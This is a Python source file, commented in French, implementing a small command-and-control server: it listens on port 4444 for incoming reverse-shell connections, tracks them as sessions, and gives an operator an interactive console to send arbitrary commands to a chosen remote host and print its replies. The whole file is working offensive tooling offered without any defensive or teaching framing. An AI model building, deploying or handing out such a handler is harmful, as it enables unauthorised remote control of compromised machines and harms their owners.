#!/usr/bin/env python3
import socket
import threading
import cmd
import sys
from datetime import datetime

class Session:
    """Une session = un socket + ses infos"""
    def __init__(self, sid, sock, addr):
        self.id = sid
        self.sock = sock
        self.addr = addr
        self.connected = datetime.now().strftime("%H:%M:%S")
        self.alive = True
    
    def send(self, cmd):
        try:
            self.sock.send((cmd + '\n').encode())
            return True
        except:
            self.alive = False
            return False
    
    def recv(self):
        try:
            return self.sock.recv(4096).decode('utf-8', errors='ignore')
        except:
            self.alive = False
            return None

class C2Handler:
    """Gestionnaire principal"""
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.sessions = {}
        self.counter = 0
        self.running = True
    
    def start(self):
        """Démarre le listener dans un thread"""
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[*] Listening on {self.host}:{self.port}")
        
        while self.running:
            try:
                sock, addr = self.server.accept()
                self.counter += 1
                session = Session(self.counter, sock, addr)
                self.sessions[session.id] = session
                print(f"[+] Session {session.id} from {addr[0]}:{addr[1]}")
                
                # Thread pour écouter les réponses
                threading.Thread(target=self._listen_session, args=(session,), daemon=True).start()
            except:
                if self.running:
                    break
    
    def _listen_session(self, session):
        """Écoute en continu une session"""
        while session.alive and self.running:
            data = session.recv()
            if data:
                # Affiche avec le bon format
                if session.id == console.current_session:
                    print(f"\n{data.strip()}")
                    print(f"session-{session.id}> ", end='', flush=True)
                else:
                    print(f"\n[{session.id}] {data.strip()}")
                    print("(c2)> ", end='', flush=True)
            else:
                print(f"\n[-] Session {session.id} disconnected")
                del self.sessions[session.id]
                break
    
    def stop(self):
        self.running = False
        try:
            self.server.close()
        except:
            pass

class Console(cmd.Cmd):
    """Interface CLI interactive"""
    prompt = "(c2)> "
    current_session = None
    
    def __init__(self, handler):
        super().__init__()
        self.handler = handler
    
    def do_list(self, arg):
        """Affiche les sessions"""
        if not self.handler.sessions:
            print("  No sessions")
            return
        print("\n  ID  |  IP            |  Connected")
        print("  ----+---------------+-----------")
        for sid, s in self.handler.sessions.items():
            mark = "*" if sid == self.current_session else " "
            print(f"  {mark}{sid:2}  |  {s.addr[0]:13}  |  {s.connected}")
        print()
    
    def do_use(self, sid):
        """Interagir avec une session: use 1"""
        try:
            sid = int(sid)
            if sid not in self.handler.sessions:
                print(f"[-] Session {sid} not found")
                return
            self.current_session = sid
            self.prompt = f"session-{sid}> "
            print(f"[*] Interacting with session {sid} (type 'back' to exit)")
        except:
            print("[-] Usage: use <session_id>")
    
    def default(self, cmd):
        """Envoie une commande à la session active"""
        if cmd.lower() in ['back', 'exit']:
            self.prompt = "(c2)> "
            self.current_session = None
            return
        
        if self.current_session is None:
            print("[-] No active session. Use 'use <id>'")
            return
        
        session = self.handler.sessions.get(self.current_session)
        if not session or not session.alive:
            print("[-] Session dead")
            self.current_session = None
            self.prompt = "(c2)> "
            return
        
        if session.send(cmd):
            # Attendre la réponse avec timeout
            import time
            time.sleep(0.3)  # Petit délai pour laisser le temps au thread d'afficher
        else:
            print("[-] Failed to send command")
    
    def do_exit(self, arg):
        """Quitte le C2"""
        print("[*] Shutting down...")
        self.handler.stop()
        return True

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port', default=4444, type=int)
    parser.add_argument('-H', '--host', default='0.0.0.0')
    args = parser.parse_args()
    
    # Lance le handler
    handler = C2Handler(args.host, args.port)
    threading.Thread(target=handler.start, daemon=True).start()
    
    # Lance la console
    global console
    console = Console(handler)
    console.cmdloop()
